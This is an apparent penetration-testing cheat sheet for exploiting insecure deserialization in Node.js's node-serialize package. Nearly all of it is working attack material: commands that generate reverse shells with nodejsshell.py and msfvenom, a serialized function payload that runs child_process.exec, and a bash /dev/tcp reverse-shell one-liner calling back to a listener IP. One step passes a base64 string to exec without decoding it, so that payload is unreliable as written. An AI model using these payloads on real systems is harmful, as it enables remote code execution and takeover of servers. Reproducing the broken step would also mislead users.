---
icon: link-slash
---

# Deserialization

{% hint style="info" %}
### <mark style="color:orange;">`nodejs`</mark>

* <mark style="color:purple;">Install</mark> <mark style="color:orange;">**`node-serialize`**</mark><mark style="color:purple;">:</mark>

```sh
npm install node-serialize
```

***

[<mark style="color:orange;">**`nodejsshell.py`**</mark>](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py) <mark style="color:purple;">**Method:**</mark>

1. <mark style="color:purple;">Create the node reverse shell:</mark>

```sh
python3 nodejsshell.py 10.10.16.8 4444
```

1. <mark style="color:purple;">Once you have a serialized reverse shell, add it to this function:</mark>

{% code overflow="wrap" %}
```javascript
var y = {
  rce: function(){ADD/THE/PAYLOAD/HERE}
}
var serialize = require('node-serialize');
var s = serialize.serialize(y)
console.log("Serialized: \n" + s.slice(0,-2) + "()" + s.slice(-2,));
```
{% endcode %}

3. <mark style="color:purple;">Now serialize convert to</mark> <mark style="color:orange;">**`base64`**</mark> <mark style="color:purple;">the exploit using</mark><mark style="color:purple;">**:**</mark>

```
nodejs exploit.js | tail -n +2 | base64 -w0
```

***

* <mark style="color:orange;">**`msfvenom`**</mark> <mark style="color:purple;">also has a module to generate payloads:</mark>

{% code overflow="wrap" %}
```sh
msfvenom -p nodejs/shell_reverse_tcp LHOST=10.10.14.10 LPORT=1337 -o shell.js
```
{% endcode %}

* <mark style="color:purple;">Another great tool is</mark> [<mark style="color:orange;">**`ysoserial`**</mark>](https://github.com/frohoff/ysoserial)

***

* Another way is to get command execution is by using this function:

{% code overflow="wrap" %}
```javascript
{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('ls /',
function(error, stdout, stderr) { console.log(stdout) });}()"}
```
{% endcode %}

* We can generate a reverse shell out of this by encoding the command first to base64:&#x20;

```sh
echo 'bash -i >& /dev/tcp/10.10.16.8/4444 0>&1' | base64
```

* Now add that string to the function like this:

{% code overflow="wrap" %}
```javascript
{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi44LzQ0NDQgMD4mMQo=',
function(error, stdout, stderr) { console.log(stdout) });}()"}
```
{% endcode %}

* Sometimes you may want URL encode the payload to make it work.
{% endhint %}

